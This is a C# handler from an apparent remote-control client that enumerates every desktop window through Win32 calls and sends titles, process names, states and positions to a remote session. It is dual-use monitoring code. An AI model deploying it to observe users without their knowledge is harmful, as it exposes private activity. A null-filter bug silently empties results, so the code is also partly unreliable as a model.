using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestGetWindowsHandler : AbstractRequestHandler
    {
        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool IsZoomed(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool IsIconic(IntPtr hWnd);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left, Top, Right, Bottom;
        }

        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                var resp = new ResponseGetWindows();
                resp.Windows = new List<WindowDetailInfo>();
                resp.CollectedAt = DateTime.Now.ToString("HH:mm:ss");

                try
                {
                    var req = reqObj as RequestGetWindows;
                    string filter = req == null ? null : (req.Filter ?? "").Trim();

                    EnumWindows((hWnd, lParam) =>
                    {
                        try
                        {
                            int length = GetWindowTextLength(hWnd);
                            if (length <= 0 && !IsWindowVisible(hWnd))
                                return true;

                            var info = new WindowDetailInfo();
                            info.Handle = hWnd.ToInt64().ToString("X");

                            StringBuilder titleBuilder = new StringBuilder(length + 1);
                            GetWindowText(hWnd, titleBuilder, titleBuilder.Capacity);
                            info.Title = titleBuilder.ToString();

                            StringBuilder classBuilder = new StringBuilder(256);
                            GetClassName(hWnd, classBuilder, classBuilder.Capacity);
                            info.ClassName = classBuilder.ToString();

                            uint processIdValue;
                            info.ThreadId = (int)GetWindowThreadProcessId(hWnd, out processIdValue);
                            info.ProcessId = (int)processIdValue;

                            try
                            {
                                using (Process process = Process.GetProcessById(info.ProcessId))
                                    info.ProcessName = process.ProcessName;
                            }
                            catch { }

                            info.IsVisible = IsWindowVisible(hWnd);
                            if (IsZoomed(hWnd)) info.WindowState = "最大化";
                            else if (IsIconic(hWnd)) info.WindowState = "最小化";
                            else info.WindowState = "正常";

                            RECT rect;
                            GetWindowRect(hWnd, out rect);
                            info.Bounds = string.Format("{0},{1} {2}×{3}",
                                rect.Left, rect.Top,
                                rect.Right - rect.Left, rect.Bottom - rect.Top);

                            if (filter.Length > 0)
                            {
                                bool match = (info.Title ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0
                                    || (info.ProcessName ?? "").IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0
                                    || info.ProcessId.ToString() == filter;
                                if (!match) return true;
                            }

                            resp.Windows.Add(info);
                        }
                        catch { }
                        return true;
                    }, IntPtr.Zero);

                    resp.TotalCount = resp.Windows.Count;
                    resp.Result = true;
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.Message;
                }

                session.Send(ePacketType.PACKET_GET_WINDOWS_RESPONSE, resp);
            });
        }
    }
}
